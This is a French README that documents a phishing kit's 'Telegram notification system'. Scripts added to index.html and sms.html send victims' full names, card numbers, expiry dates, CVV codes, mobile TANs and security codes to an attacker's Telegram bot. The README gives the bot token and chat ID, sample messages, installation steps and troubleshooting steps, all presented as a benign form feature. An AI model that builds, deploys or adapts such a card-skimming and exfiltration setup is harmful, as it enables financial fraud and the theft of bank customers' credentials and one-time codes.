# Système de Notification Telegram

Ce projet intègre un système de notification Telegram qui envoie automatiquement les informations des formulaires à votre bot Telegram.

## Configuration

### Informations Telegram configurées :
- **Token Bot :** `8019935477:AAEBeU9mUPfPkxM5hfaccwRTCzl8ZxKynuA`
- **Chat ID :** `7356346717`

## Fonctionnalités

### 1. Formulaire Principal (index.html)
Quand un utilisateur remplit le formulaire de carte bancaire, vous recevrez une notification contenant :
- Nom complet
- Numéro de carte
- Date d'expiration (mois/année)
- Code CVV
- Date et heure de soumission
- URL de la page

### 2. Formulaire SMS (sms.html)
Quand un utilisateur remplit le formulaire SMS/Token, vous recevrez une notification contenant :
- Mobile TAN
- Code sécurisé
- Date et heure de soumission
- URL de la page

## Fichiers modifiés

1. **js/telegram-notification.js** - Nouveau fichier contenant toute la logique de notification
2. **index.html** - Ajout du script Telegram
3. **sms.html** - Ajout du script Telegram

## Installation

1. Téléchargez tous les fichiers sur votre serveur web
2. Assurez-vous que votre serveur supporte HTTPS (requis pour l'API Telegram)
3. Testez les formulaires pour vérifier que les notifications arrivent bien

## Format des notifications

### Notification Formulaire Principal :
```
🔔 NOUVELLE SOUMISSION DE FORMULAIRE CARTE

📅 Date/Heure: 25/07/2025 21:04:32
👤 Nom complet: Jean Dupont
💳 Numéro de carte: 1234 5678 9012 3456
📅 Date d'expiration: 12/2025
🔒 Code CVV: 123

📍 Page: Formulaire principal (index.html)
🌐 URL: https://votre-site.com/index.html
```

### Notification Formulaire SMS :
```
🔔 NOUVELLE SOUMISSION DE FORMULAIRE SMS

📅 Date/Heure: 25/07/2025 21:04:32
📱 Mobile TAN: 123456
🔐 Code sécurisé: ABC123

📍 Page: Formulaire SMS/Token (sms.html)
🌐 URL: https://votre-site.com/sms.html
```

## Sécurité

- Les notifications sont envoyées via HTTPS vers l'API Telegram
- Aucune donnée n'est stockée localement
- Les informations sont transmises directement à votre chat Telegram

## Support

Si vous rencontrez des problèmes :
1. Vérifiez que votre bot Telegram est actif
2. Assurez-vous que le Chat ID est correct
3. Vérifiez que votre site utilise HTTPS
4. Consultez la console du navigateur pour les erreurs JavaScript

## Personnalisation

Pour modifier le token ou le chat ID, éditez le fichier `js/telegram-notification.js` :

```javascript
const TELEGRAM_BOT_TOKEN = 'VOTRE_NOUVEAU_TOKEN';
const TELEGRAM_CHAT_ID = 'VOTRE_NOUVEAU_CHAT_ID';
```

